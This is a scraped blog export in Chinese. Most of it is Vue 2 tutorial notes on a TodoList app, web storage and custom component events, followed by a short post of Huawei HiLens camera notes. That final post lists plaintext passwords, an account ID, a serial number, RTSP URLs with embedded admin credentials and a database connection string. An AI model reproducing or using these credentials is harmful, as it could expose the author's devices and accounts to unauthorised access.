TodoItem from &quot;.&#x2F;TodoItem.vue&quot;;export default &#123; name: &quot;TodoList&quot;, components: &#123; TodoItem &#125;, props: [&quot;todos&quot;, &quot;checkTodo&quot;, &quot;deleteTodo&quot;],&#125;;&lt;&#x2F;script&gt; TodoItem.vue 1234567891011121314151617181920212223242526272829303132&lt;template&gt; &lt;li&gt; &lt;label&gt; &lt;input type&#x3D;&quot;checkbox&quot; :checked&#x3D;&quot;todo.done&quot; @click&#x3D;&quot;handlecheck(todo.id)&quot; &#x2F;&gt; &lt;span&gt;&#123;&#123; todo.title &#125;&#125;&lt;&#x2F;span&gt; &lt;&#x2F;label&gt; &lt;button class&#x3D;&quot;btn btn-danger&quot; @click&#x3D;&quot;handleDelete(todo.id)&quot;&gt;删除&lt;&#x2F;button&gt; &lt;&#x2F;li&gt;&lt;&#x2F;template&gt;&lt;script&gt;export default &#123; name: &quot;TodoItem&quot;, props: [&quot;todo&quot;, &quot;checkTodo&quot;, &quot;deleteTodo&quot;], methods: &#123; handlecheck(id) &#123; &#x2F;&#x2F; 通知App组件将对应的Todo对象的done值取反 this.checkTodo(id); &#125;, handleDelete(id) &#123; &#x2F;&#x2F; 删除代办事项 if (confirm(&quot;确定删除吗~~？&quot;)) &#123; this.deleteTodo(id); &#125; &#125;, &#125;,&#125;;&lt;&#x2F;script&gt; 3.10.6 底部统计reduce方法： Array.prototype.reduce() 123456789101112131415161718arr.reduce(callback(accumulator, currentValue[, index[, array]])[, initialValue])参数callback执行数组中每个值 (如果没有提供 initialValue则第一个值除外)的函数，包含四个参数：accumulator累计器累计回调的返回值; 它是上一次调用回调时返回的累积值，或initialValue（见于下方）。currentValue数组中正在处理的元素。index 可选数组中正在处理的当前元素的索引。 如果提供了initialValue，则起始索引号为0，否则从索引1起始。array可选调用reduce()的数组initialValue可选作为第一次调用 callback函数时的第一个参数的值。 如果没有提供初始值，则将使用数组中的第一个元素。 在没有初始值的空数组上调用 reduce 将报错。注意：如果没有提供initialValue，reduce 会从索引1的地方开始执行 callback 方法，跳过第一个索引。如果提供initialValue，从索引0开始。 TodoItem.vue 12345678910111213141516171819202122232425&lt;template&gt; &lt;div class&#x3D;&quot;todo-footer&quot;&gt; &lt;label&gt; &lt;input type&#x3D;&quot;checkbox&quot; &#x2F;&gt; &lt;&#x2F;label&gt; &lt;span&gt; &lt;span&gt;已完成&#123;&#123; totalDone &#125;&#125;&lt;&#x2F;span&gt; &#x2F; 全部 &#123;&#123; todos.length &#125;&#125;&lt;&#x2F;span &gt; &lt;button class&#x3D;&quot;btn btn-danger&quot;&gt;清除已完成任务&lt;&#x2F;button&gt; &lt;&#x2F;div&gt;&lt;&#x2F;template&gt;&lt;script&gt;export default &#123; name: &quot;TodoFooter&quot;, props: [&quot;todos&quot;], computed: &#123; totalDone() &#123; return this.todos.reduce((pre, todo) &#x3D;&gt; &#123; return pre + (todo.done ? 1 : 0); &#125;, 0); &#125;, &#125;,&#125;;&lt;&#x2F;script&gt; 3.10.7 底部交互使用父传子实现Footer.vue 12345678910111213141516171819202122232425262728293031323334&lt;template&gt; &lt;div class&#x3D;&quot;todo-footer&quot; v-show&#x3D;&quot;totalDone&quot;&gt; &lt;label&gt; &lt;input type&#x3D;&quot;checkbox&quot; :checked&#x3D;&quot;isAll&quot; @change&#x3D;&quot;checkAll&quot; &#x2F;&gt; &lt;!-- &lt;input type&#x3D;&quot;checkbox&quot; v-model&#x3D;&quot;isAll&quot; &#x2F;&gt; --&gt; &lt;&#x2F;label&gt; &lt;span&gt; &lt;span&gt;已完成&#123;&#123; totalDone &#125;&#125;&lt;&#x2F;span&gt; &#x2F; 全部 &#123;&#123; todos.length &#125;&#125;&lt;&#x2F;span &gt; &lt;button class&#x3D;&quot;btn btn-danger&quot;&gt;清除已完成任务&lt;&#x2F;button&gt; &lt;&#x2F;div&gt;&lt;&#x2F;template&gt;&lt;script&gt;export default &#123; name: &quot;TodoFooter&quot;, props: [&quot;todos&quot;, &quot;checkAllTodo&quot;], computed: &#123; totalDone() &#123; return this.todos.reduce((pre, todo) &#x3D;&gt; &#123; return pre + (todo.done ? 1 : 0); &#125;, 0); &#125;, isAll() &#123; return this.totalDone &#x3D;&#x3D;&#x3D; this.todos.length &amp;&amp; this.totalDone &gt; 0; &#125;, &#125;, methods: &#123; checkAll(event) &#123; this.checkAllTodo(event.target.checked); &#125;, &#125;,&#125;;&lt;&#x2F;script&gt; App.vue 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960&lt;template&gt; &lt;div id&#x3D;&quot;root&quot;&gt; &lt;div class&#x3D;&quot;todo-container&quot;&gt; &lt;div class&#x3D;&quot;todo-wrap&quot;&gt; &lt;TodoHeader :getAdd&#x3D;&quot;getAdd&quot;&gt;&lt;&#x2F;TodoHeader&gt; &lt;TodoList :todos&#x3D;&quot;todos&quot; :checkTodo&#x3D;&quot;checkTodo&quot; :deleteTodo&#x3D;&quot;deleteTodo&quot; &gt;&lt;&#x2F;TodoList&gt; &lt;TodoFooter :todos&#x3D;&quot;todos&quot; :checkAllTodo&#x3D;&quot;checkAllTodo&quot;&gt;&lt;&#x2F;TodoFooter&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt;&lt;&#x2F;template&gt;&lt;script&gt;import TodoFooter from &quot;.&#x2F;components&#x2F;TodoFooter.vue&quot;;import TodoHeader from &quot;.&#x2F;components&#x2F;TodoHeader.vue&quot;;import TodoList from &quot;.&#x2F;components&#x2F;TodoList.vue&quot;;export default &#123; name: &quot;App&quot;, components: &#123; TodoFooter, TodoHeader, TodoList &#125;, data() &#123; return &#123; todos: [ &#123; id: &quot;001&quot;, title: &quot;吃饭&quot;, done: true &#125;, &#123; id: &quot;002&quot;, title: &quot;睡觉&quot;, done: false &#125;, &#123; id: &quot;003&quot;, title: &quot;打游戏&quot;, done: true &#125;, ], &#125;; &#125;, methods: &#123; getAdd(Obj) &#123; &#x2F;&#x2F; 添加一个代办 this.todos.unshift(Obj); &#125;, checkTodo(id) &#123; &#x2F;&#x2F; 勾选 &#x2F; 取消勾选一个待办事项 this.todos.forEach((todo) &#x3D;&gt; &#123; if (todo.id &#x3D;&#x3D;&#x3D; id) todo.done &#x3D; !todo.done; &#125;); &#125;, deleteTodo(id) &#123; &#x2F;&#x2F; 删除一个代办事项 this.todos &#x3D; this.todos.filter((todo) &#x3D;&gt; &#123; return todo.id !&#x3D;&#x3D; id; &#125;); &#125;, checkAllTodo(done) &#123; this.todos.forEach((todo) &#x3D;&gt; &#123; todo.done &#x3D; done; &#125;); &#125;, &#125;,&#125;;&lt;&#x2F;script&gt; v-model实现1&lt;input type&#x3D;&quot;checkbox&quot; v-model&#x3D;&quot;isAll&quot; &#x2F;&gt; 问题产生原因：isAll是一个计算属性，下面的写法要求isAll只被读取，不会直接被修改。但是对底部勾选后会全选，那么势必会修改isAll App.vue 添加删除已选事项功能 123456789101112131415161718192021222324252627282930313233343536373839&lt;template&gt; &lt;div class&#x3D;&quot;todo-footer&quot; v-show&#x3D;&quot;totalDone&quot;&gt; &lt;label&gt; &lt;!-- &lt;input type&#x3D;&quot;checkbox&quot; :checked&#x3D;&quot;isAll&quot; @change&#x3D;&quot;checkAll&quot; &#x2F;&gt; --&gt; &lt;input type&#x3D;&quot;checkbox&quot; v-model&#x3D;&quot;isAll&quot; &#x2F;&gt; &lt;&#x2F;label&gt; &lt;span&gt; &lt;span&gt;已完成&#123;&#123; totalDone &#125;&#125;&lt;&#x2F;span&gt; &#x2F; 全部 &#123;&#123; todos.length &#125;&#125;&lt;&#x2F;span &gt; &lt;button class&#x3D;&quot;btn btn-danger&quot; @click&#x3D;&quot;clearAll&quot;&gt;清除已完成任务&lt;&#x2F;button&gt; &lt;&#x2F;div&gt;&lt;&#x2F;template&gt;&lt;script&gt;export default &#123; name: &quot;TodoFooter&quot;, props: [&quot;todos&quot;, &quot;checkAllTodo&quot;, &quot;clearAllTodos&quot;], computed: &#123; totalDone() &#123; return this.todos.reduce((pre, todo) &#x3D;&gt; &#123; return pre + (todo.done ? 1 : 0); &#125;, 0); &#125;, isAll: &#123; get() &#123; return this.totalDone &#x3D;&#x3D;&#x3D; this.todos.length &amp;&amp; this.totalDone &gt; 0; &#125;, set(value) &#123; this.checkAllTodo(value); &#125;, &#125;, &#125;, methods: &#123; clearAll() &#123; this.clearAllTodos(); &#125;, &#125;,&#125;;&lt;&#x2F;script&gt; 由于这里并没有修改props传入的数据，而是绑定自身的一个计算属性，所以完全没有问题。 3.10.8 案例总结 组件化编码流程 拆分静态组件：组件要按照功能点拆分，命名不要和html元素冲突 实现动态组件：考虑好数据存储位置，数据是一个组件在用还是一些组件在使用 一个组件在用：放在组件自身即可 多个组件在使用，放在它们共同的父组件上（状态提升） 实现交互：从绑定事件开始 props适用于： 父组件 ===&gt; 子组件 通信 子组件 ===&gt; 父组件 通信（要求父先给子一个函数） 使用v-model时要切记：v-model绑定的值不能是props传入的值，因为props是不可以修改的！ props传过来的若是对象类型的数据，修改对象中的属性值时不会报错，但是不推荐这样做。 3.11 浏览器本地存储不是Vue特有的，原本JS中就有该功能，所以完全可以在html文件中书写。 借助本地存储实现（后续由唯品会测试，淘宝貌似加密了）： 1234//传入参数分别为key / value，且必须都是字符串，输入数值会被转换为字符串，只要不是字符串，默认调用toStringlocalStorage.setItem(&#x27;person&#x27;, zhul)// 和zhul.toString()效果一样 解决： 1localStorage.setItem(&#x27;person&#x27;, JSON.stringify(zhul)) localStorage：关闭浏览器后仍然有效，用户主动清空缓存就会被删除 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;localStorage&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h2&gt;localStorage&lt;/h2&gt; &lt;button onclick=&quot;saveData()&quot;&gt;点我保存数据&lt;/button&gt; &lt;button onclick=&quot;readData()&quot;&gt;点我读取数据&lt;/button&gt; &lt;button onclick=&quot;deleteData()&quot;&gt;点我删除数据&lt;/button&gt; &lt;button onclick=&quot;clearData()&quot;&gt;点我清空数据&lt;/button&gt; &lt;script&gt; let zhul = &#123; name: &#x27;张加林&#x27;, age: 20 &#125; function saveData() &#123; localStorage.setItem(&#x27;name&#x27;, &#x27;miketaylor&#x27;) //传入参数分别为key / value，且必须都是字符串，输入数值会被转换为字符串 localStorage.setItem(&#x27;person&#x27;, JSON.stringify(zhul)) &#125; function readData() &#123; let result = localStorage.getItem(&#x27;person&#x27;) console.log(JSON.parse(result)) console.log(localStorage.getItem(&#x27;no exists&#x27;)); // 不存在返回null &#125; function deleteData() &#123; localStorage.removeItem(&#x27;name&#x27;) &#125; function clearData() &#123; localStorage.clear() &#125; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; sessionStorage：所有的API和localStorage相同，关闭浏览器后就会被清空 总结 webStorage、 浏览器通过Windows.sessionStorage和Windows.localStorage属性来实现本地存储机制 存储内容大小一般支持5MB左右（不同浏览器可能不同） 相关API xxxxxxStorage.setItem(&#39;key&#39;,&#39;value&#39;); 12345 该方法接收一个键和值作为参数，会把键值对添加到存储中，如果键名存在，则更新其对应的值* ```js xxxxxxStorage.getItem(&#x27;person&#x27;) 该方法接收一个键名作为参数，返回键名对应的值 xxxxxxStorage.remove(&#39;key&#39;) 12345 该方法接收一个键名作为参数，并将该键名从存储中删除* ```js xxxxxStorage.clear() 该方法会清空存储中的所有数据 备注： sessionStorage存储的内容会随着浏览器的关闭而消失 localStorage存储的内容，需要手动清除才会消失 调用API 清空浏览器缓存 xxxxxStorage.getItem(xxx)如果xxx对应的value获取不到，那么getItem的返回值是null JSON.parse(null)的结果依然是null TodoList本地存储实现App.vue 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172&lt;template&gt; &lt;div id&#x3D;&quot;root&quot;&gt; &lt;div class&#x3D;&quot;todo-container&quot;&gt; &lt;div class&#x3D;&quot;todo-wrap&quot;&gt; &lt;TodoHeader :getAdd&#x3D;&quot;getAdd&quot;&gt;&lt;&#x2F;TodoHeader&gt; &lt;TodoList :todos&#x3D;&quot;todos&quot; :checkTodo&#x3D;&quot;checkTodo&quot; :deleteTodo&#x3D;&quot;deleteTodo&quot; &gt;&lt;&#x2F;TodoList&gt; &lt;TodoFooter :todos&#x3D;&quot;todos&quot; :checkAllTodo&#x3D;&quot;checkAllTodo&quot; :clearAllTodos&#x3D;&quot;clearAllTodos&quot; &gt;&lt;&#x2F;TodoFooter&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt;&lt;&#x2F;template&gt;&lt;script&gt;import TodoFooter from &quot;.&#x2F;components&#x2F;TodoFooter.vue&quot;;import TodoHeader from &quot;.&#x2F;components&#x2F;TodoHeader.vue&quot;;import TodoList from &quot;.&#x2F;components&#x2F;TodoList.vue&quot;;export default &#123; name: &quot;App&quot;, components: &#123; TodoFooter, TodoHeader, TodoList &#125;, data() &#123; return &#123; todos: JSON.parse(localStorage.getItem(&quot;todos&quot;)), &#125;; &#125;, methods: &#123; getAdd(Obj) &#123; &#x2F;&#x2F; 添加一个代办 this.todos.unshift(Obj); &#125;, checkTodo(id) &#123; &#x2F;&#x2F; 勾选 &#x2F; 取消勾选一个待办事项 this.todos.forEach((todo) &#x3D;&gt; &#123; if (todo.id &#x3D;&#x3D;&#x3D; id) todo.done &#x3D; !todo.done; &#125;); &#125;, deleteTodo(id) &#123; &#x2F;&#x2F; 删除一个代办事项 this.todos &#x3D; this.todos.filter((todo) &#x3D;&gt; &#123; return todo.id !&#x3D;&#x3D; id; &#125;); &#125;, checkAllTodo(done) &#123; &#x2F;&#x2F; 全选或全不选 this.todos.forEach((todo) &#x3D;&gt; &#123; todo.done &#x3D; done; &#125;); &#125;, clearAllTodos() &#123; &#x2F;&#x2F; 清除所有已经完成的Todos this.todos &#x3D; this.todos.filter((todo) &#x3D;&gt; &#123; return !todo.done; &#125;); &#125;, &#125;, watch: &#123; todos(value) &#123; localStorage.setItem(&quot;todos&quot;, JSON.stringify(value)); &#125;, &#125;,&#125;;&lt;&#x2F;script&gt; 因为最开始使用时，本地缓存中没有todos项，则为null，将null传给footer，footer使用length计算长度，但是null上没有length属性，就会报错。 解决： 刷新会导致已经勾选的已经完成的勾选状态丢失。 解决：使用深度监视 3.11 组件自定义事件3.11.1 绑定自定义事件 分别使用父组件传递函数给子组件和自定义事件实现子组件向父组件传递数据。 App.vue 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;template&gt; &lt;div class&#x3D;&quot;demo&quot;&gt; &lt;h2&gt;&#123;&#123; msg &#125;&#125;&lt;&#x2F;h2&gt; &lt;!-- 通过父组件给子组件传递函数类型的props实现：子给父传递数据 --&gt; &lt;Student :getStudentName&#x3D;&quot;getStudentName&quot; &#x2F;&gt; &lt;hr &#x2F;&gt; &lt;!-- 通过父组件给子组件绑定一个自定义事件实现：子向父传递数据 （写法一：使用@或v-on）--&gt; &lt;!-- &lt;School v-on:miketaylor&#x3D;&quot;getSchoolName&quot; &#x2F;&gt; --&gt; &lt;!-- 通过父组件给子组件绑定一个自定义事件实现：子向父传递数据 （第二种写法，使用ref，灵活性更强）--&gt; &lt;School ref&#x3D;&quot;school&quot;&gt;&lt;&#x2F;School&gt; &lt;&#x2F;div&gt;&lt;&#x2F;template&gt;&lt;script&gt;&#x2F;&#x2F; 引入组件import Student from &quot;.&#x2F;components&#x2F;Student&quot;;import School from &quot;.&#x2F;components&#x2F;School&quot;;export default &#123; name: &quot;App&quot;, components: &#123; Student, School &#125;, data() &#123; return &#123; msg: &quot;你好鸭&quot;, &#125;; &#125;, methods: &#123; getStudentName(StudentName) &#123; console.log(&quot;学生姓名为：&quot;, StudentName); &#125;, getSchoolName(SchoolName) &#123; console.log(&quot;学校名称为：&quot;, SchoolName); &#125;, &#125;, mounted() &#123; &#x2F;&#x2F; 灵活性强：实现延迟加载自定义事件 &#x2F; Ajax请求发送完回来绑定自定义事件 setTimeout(() &#x3D;&gt; &#123; this.$refs.school.$on(&quot;miketaylor&quot;, this.getSchoolName); &#125;, 3000); &#125;,&#125;;&lt;&#x2F;script&gt;&lt;style&gt;.demo &#123; background-color: #999; padding: 5px;&#125;&lt;&#x2F;style&gt; Student.vue 12345678910111213141516171819202122232425262728293031323334&lt;template&gt; &lt;div class&#x3D;&quot;student&quot;&gt; &lt;h2&gt;姓名:&#123;&#123; name &#125;&#125;&lt;&#x2F;h2&gt; &lt;h2&gt;年龄:&#123;&#123; age &#125;&#125;&lt;&#x2F;h2&gt; &lt;button @click&#x3D;&quot;sendStudentName&quot;&gt;获取学生姓名&lt;&#x2F;button&gt; &lt;&#x2F;div&gt;&lt;&#x2F;template&gt;&lt;script&gt;export default &#123; name: &quot;Student&quot;, props: [&quot;getStudentName&quot;], data() &#123; return &#123; age: 20, name: &quot;张加林&quot;, &#125;; &#125;, methods: &#123; sendStudentName() &#123; this.getStudentName(this.name); &#125;, &#125;,&#125;;&lt;&#x2F;script&gt;&lt;style&gt;.student &#123; background-color: #8080ff; padding: 5px; margin-top: 30px;&#125;&lt;&#x2F;style&gt; School.vue 1234567891011121314151617181920212223242526272829303132&lt;template&gt; &lt;div class&#x3D;&quot;school&quot;&gt; &lt;h2&gt;学校名称：&#123;&#123; name &#125;&#125;&lt;&#x2F;h2&gt; &lt;h2&gt;学校地址：&#123;&#123; address &#125;&#125;&lt;&#x2F;h2&gt; &lt;button @click&#x3D;&quot;sendStudentName&quot;&gt;点击获取学校名称&lt;&#x2F;button&gt; &lt;&#x2F;div&gt;&lt;&#x2F;template&gt;&lt;script&gt;export default &#123; name: &quot;School&quot;, data() &#123; return &#123; name: &quot;UESTC&quot;, address: &quot;成华区建设路&quot;, &#125;; &#125;, methods: &#123; sendStudentName() &#123; &#x2F;&#x2F; 触发School组件实例对象身上的miketaylor事件 this.$emit(&quot;miketaylor&quot;, this.name); &#125;, &#125;,&#125;;&lt;&#x2F;script&gt;&lt;style&gt;.school &#123; background-color: #99ff00; padding: 5px;&#125;&lt;&#x2F;style&gt; 延迟加载自定义事件，在mounted中使用$on： 让自定义事件只能触发一次： 或者： 接收多个参数： 但是开发中一般不这样传参，可以先把参数封装成一个对象，还可以使用ES6的...a，下面表示第一个参数正常接收，后面其他的参数存储在数组a中 3.11.2 解绑自定义事件12345678910111213 &lt;School v-on:miketaylor=&quot;getSchoolName&quot; @demo=&quot;test1&quot; /&gt;…………&lt;button @click=&quot;unbind&quot;&gt;解绑miketaylor事件&lt;/button&gt;…………unbind() &#123;// 解绑一个自定义事件this.$off(&quot;miketaylor&quot;);// 解绑指定的多个自定义事件this.$off([&quot;miketaylor&quot;, &quot;demo&quot;]);// 解绑所有的自定义事件this.$off();&#125;, App.vue 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;template&gt; &lt;div class&#x3D;&quot;demo&quot;&gt; &lt;h2&gt;&#123;&#123; msg &#125;&#125;&lt;&#x2F;h2&gt; &lt;!-- 通过父组件给子组件传递函数类型的props实现：子给父传递数据 --&gt; &lt;Student :getStudentName&#x3D;&quot;getStudentName&quot; &#x2F;&gt; &lt;hr &#x2F;&gt; &lt;!-- 通过父组件给子组件绑定一个自定义事件实现：子向父传递数据 （写法一：使用@或v-on）--&gt; &lt;School v-on:miketaylor&#x3D;&quot;getSchoolName&quot; @demo&#x3D;&quot;test1&quot; &#x2F;&gt; &lt;!-- 通过父组件给子组件绑定一个自定义事件实现：子向父传递数据 （第二种写法，使用ref，灵活性更强）--&gt; &lt;!-- &lt;School ref&#x3D;&quot;school&quot;&gt;&lt;&#x2F;School&gt; --&gt; &lt;&#x2F;div&gt;&lt;&#x2F;template&gt;&lt;script&gt;&#x2F;&#x2F; 引入组件import Student from &quot;.&#x2F;components&#x2F;Student&quot;;import School from &quot;.&#x2F;components&#x2F;School&quot;;export default &#123; name: &quot;App&quot;, components: &#123; Student, School &#125;, data() &#123; return &#123; msg: &quot;你好鸭&quot;, &#125;; &#125;, methods: &#123; getStudentName(StudentName) &#123; console.log(&quot;学生姓名为：&quot;, StudentName); &#125;, getSchoolName(SchoolName) &#123; console.log(&quot;学校名称为：&quot;, SchoolName); &#125;, test1() &#123; console.log(&quot;demo事件被触发了！&quot;); &#125;, &#125;, &#x2F;&#x2F; mounted() &#123; &#x2F;&#x2F; 灵活性强：实现延迟加载自定义事件 &#x2F; Ajax请求发送完回来绑定自定义事件 &#x2F;&#x2F; setTimeout(() &#x3D;&gt; &#123; &#x2F;&#x2F; this.$refs.school.$on(&quot;miketaylor&quot;, this.getSchoolName); &#x2F;&#x2F; &#125;, 3000); &#x2F;&#x2F; this.$refs.school.$on(&quot;miketaylor&quot;, this.getSchoolName); &#x2F;&#x2F; this.$refs.school.$once(&quot;miketaylor&quot;, this.getSchoolName); &#x2F;&#x2F; &#125;,&#125;;&lt;&#x2F;script&gt;&lt;style&gt;.demo &#123; background-color: #999; padding: 5px;&#125;&lt;&#x2F;style&gt; School.vue 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;template&gt; &lt;div class&#x3D;&quot;school&quot;&gt; &lt;h2&gt;学校名称：&#123;&#123; name &#125;&#125;&lt;&#x2F;h2&gt; &lt;h2&gt;学校地址：&#123;&#123; address &#125;&#125;&lt;&#x2F;h2&gt; &lt;button @click&#x3D;&quot;sendSchoolName&quot;&gt;点击获取学校名称&lt;&#x2F;button&gt; &lt;!-- 解绑一个自定义事件 --&gt; &lt;button @click&#x3D;&quot;unbind&quot;&gt;解绑miketaylor事件&lt;&#x2F;button&gt; &lt;&#x2F;div&gt;&lt;&#x2F;template&gt;&lt;script&gt;export default &#123; name: &quot;School&quot;, data() &#123; return &#123; name: &quot;UESTC&quot;, address: &quot;成华区建设路&quot;, &#125;; &#125;, methods: &#123; sendSchoolName() &#123; &#x2F;&#x2F; 触发School组件实例对象身上的miketaylor事件 this.$emit(&quot;miketaylor&quot;, this.name); this.$emit(&quot;demo&quot;); &#125;, unbind() &#123; &#x2F;&#x2F; 解绑一个自定义事件 &#x2F;&#x2F; this.$off(&quot;miketaylor&quot;); &#x2F;&#x2F; 解绑指定的多个自定义事件 &#x2F;&#x2F; this.$off([&quot;miketaylor&quot;, &quot;demo&quot;]); &#x2F;&#x2F; 解绑所有的自定义事件 this.$off(); &#125;, &#125;,&#125;;&lt;&#x2F;script&gt;&lt;style&gt;.school &#123; background-color: #99ff00; padding: 5px;&#125;&lt;&#x2F;style&gt; main.js 1234567891011121314151617// 引入Vueimport Vue from &quot;vue&quot;;// 引入Appimport App from &quot;./App.vue&quot;;// 关闭生产提示Vue.config.productionTip = false;// 创建vmnew Vue(&#123; components: &#123; App &#125;, render: (h) =&gt; h(App), mounted() &#123; setTimeout(() =&gt; &#123; this.$destroy(); &#125;, 3000); &#125;,&#125;).$mount(&quot;#app&quot;); School.vue 1&lt;button @click=&quot;death&quot;&gt;销毁当前School组件的实例（vc）&lt;/button&gt; 1234death() &#123; // 销毁了当前School组件实例，销毁后，所有School实例的自定义事件全都不奏效了 this.$destroy(); &#125;, 3.11.3 总结 注意： 12&lt;h2&gt;&#123;&#123; msg &#125;&#125;，学校名称是&#123;&#123; schoolName &#125;&#125;&lt;/h2&gt;&lt;School ref=&quot;school&quot;&gt;&lt;/School&gt; 12345mounted() &#123; this.$refs.school.$on(&quot;miketaylor&quot;, function (SchoolName) &#123; this.schoolName = SchoolName; &#125;);&#125;, 这样点击事件是读取不到SchoolName数据的 输出此处的this： this是School组件实例对象，因为Vue事件的回调当中的this，是事件的触发者，原来methods中写法没有问题，是因为getSchooName由Vue管理，this指向仍为App组件实例对象。 解决方法： 使用箭头函数就没问题了，因为箭头函数没有自己的this，向外找到了mounted函数的this，而该mounted函数由App组件实例对象管理。 在组件标签上使用原生DOM事件 1&lt;School ref=&quot;school&quot; @click=&quot;show&quot;&gt;&lt;/School&gt; 123show() &#123; alert(&quot;你好!&quot;); &#125;, 默认组件标签上绑定的事件都是自定义事件，在School添加触发语句this.$emit就能生效。 要想让组件标签识别原生DOM事件，加.native修饰符即可： 1&lt;School ref=&quot;school&quot; @click。native=&quot;show&quot;&gt;&lt;/School&gt; 组件自定义事件 一种组件之间通信的方式，适用于：子组件 =&gt; 父组件 使用场景：A是B组件的父组件，B想给A传递数据，那么就要在A中给B绑定自定义事件（事件的回调在A中） 绑定自定义事件： 方式一：在父组件中： 123&lt;School v-on:miketaylor=&quot;getSchoolName&quot; /&gt;或&lt;School @miketaylor=&quot;getSchoolName&quot; /&gt; 方式二： 1&lt;School ref=&quot;school&quot;/&gt; 123456mounted() &#123; this.$refs.school.$on(&quot;miketaylor&quot;, (SchoolName) =&gt; &#123; console.log(this); this.schoolName = SchoolName; &#125;); &#125; 若想让自定义事件只触发一次，可以使用once修饰符或$once方法 触发自定义事件： 1this.$emit(&#x27;miketaylor&#x27;,数据) 解绑自定义事件 1this.$off() 组件上也可以绑定原生DOM事件，需要使用native修饰符 注意：通过this.$refs.xxx.$on(&#39;miketaylor&#39;,回调)绑定自定义事件时，回调要么配置在methods中，要么使用箭头函数，否则this指向会出问题！ 3.11.4 修改TodoList案例(略)原本的案例中回调都已经写好了，将v-bind改为@ / v-on:绑定自定义事件即可，在子组件中，删除props接收对应的内容，添加this.$emit(&quot;事件名&quot;,[数据])即可。 3.12 全局事件总线3.13 消息订阅与发布3.14 过渡与动画3.14 $nextTick3.15 第四章 Vue中的Ajax第五章 Vuex第六章 Vue-Router第七章 Vue UI组件库7.1 移动端常用 UI 组件库 Vant https://youzan.github.io/vant Cube UI https://didi.github.io/cube-ui Mint UI http://mint-ui.github.io 7.2 PC 端常用 UI 组件库 Element UI https://element.eleme.cn IView UI https://www.iviewui.co 第八章 Vue 3.08.1 简介8.2 创建工程8.3 分析工程结构","categories":[],"tags":[{"name":"Vue","slug":"Vue","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/Vue/"}]},{"title":"SDC","slug":"SDC","date":"2021-07-26T13:05:21.000Z","updated":"2021-12-01T07:38:33.132Z","comments":true,"path":"2021/07/26/SDC/","link":"","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/2021/07/26/SDC/","excerpt":"","text":"HiLens开发基础配置SDC APP无法访问网络，只能通过SDC提供的HTTP代理或者TCP/UDP代理和外界交 互。 huawei@123 Huawei123 ssh : develop@123 华为云：hid_o_wr4qm_ay0v521 IAM：zjl 密码*：Z****. 工作重点： 权限管理 组网 论坛 问hilens kit如何用asp.net web网站程序控制，不用控制台？ 控制台接口暂未开放，无法支持asp.net web网站程序控制，预计10月份将开放控制台接口。 目前可通过控制台和SSH连接HiLens Kit，API接口可通过API Explorer获取： https://apiexplorer.developer.huaweicloud.com/apiexplorer/doc?product=HiLens&amp;api=DeleteDevice 设备连接指引： https://support.huaweicloud.com/usermanual-hilens/hilens_02_0048.html 张小白的HiLens初体验_HiLens_EI企业智能_华为云论坛 (huaweicloud.com) 【云小课】EI第14课 玩转HiLens Studio之手机实时视频流调试代码_HiLens_EI企业智能_华为云论坛 (huaweicloud.com) HiLens常见问题汇总第2期_HiLens_EI企业智能_华为云论坛 (huaweicloud.com) 【HilensKit】HilensKit可以实现打电话的功能么_HiLens_EI企业智能_华为云论坛 (huaweicloud.com) 【hilens】【信号量输出】请教下hilens如何和外设联动？_HiLens_EI企业智能_华为云论坛 (huaweicloud.com) SDC账号密码合集： Huawei@123 ChangeMe123 HuaWei123 cd /usr/alg_model/ninetest/ vi /usr/alg_model/ninetest/V huawei@123 序列号SN:2102312SSF10KA000009 zhulan@Z ApiAdmin/HuaWei123 rtsp://admin:Huawei@&#x31;&#50;&#51;&#x40;&#x31;&#57;&#x32;&#x2e;&#x31;&#54;&#56;&#x2e;&#x30;&#x2e;&#x31;&#50;&#48; 1ffmpeg -re -i rtsp://admin:HuaWei123@192.168.0.20/LiveMedia/ch1/Media1 -vcodec copy -acodec copy -f flv rtmp://192.168.0.19:1935/myapp/dash 1ffmpeg -rtsp_transport tcp -i rtsp://admin:HuaWei123@192.168.0.20/LiveMedia/ch1/Media1 -qscale:v 0 -qscale:a 0 -ar 22050 -c:v libx264 -f flv rtmp://192.168.0.19:1935/myapp/dash 123456789101112131415161718192021222324ffmpeg -i 去人像前.mp4 -codec copy -bsf: h264_mp4toannexb -f h264 test1.h264 效果好ffmpeg -i 去人像后.mp4 -codec copy -bsf: h264_mp4toannexb -f h264 ls.h264 效果好ffmpeg -i 去人像前.mp4 -vcodec h264 test2.h264ffmpeg -i 去人像前.mp4 -c:v libx264 test3.h264ffmpeg -i 去人像前.mp4 -c h264 test4.h264 // ffmpeg -i QQ视频20210919021302.mp4 -c:v libx264 down.h264 抖动 1ffmpeg -ss 0 -i 李顺.mp4 -to 10 -c copy 李顺2.mp4 1mongodb+srv://admin:&lt;zhulan&gt;@cluster0.m74a9.mongodb.net/myFirstDatabase?retryWrites=true&amp;w=majority 123456// 实时截取ffmpeg -i rtsp://admin:HuaWei123@192.168.0.20/LiveMedia/ch1/Media1 -r 1 -q:v 2 -f image2 F:\\\\全栈项目\\\\ffmpeg_cut\\\\pic-%03d.jpeg// -r 表示每一秒几帧-q:v表示存储jpeg的图像质量，一般2是高质量。 1ssh -T 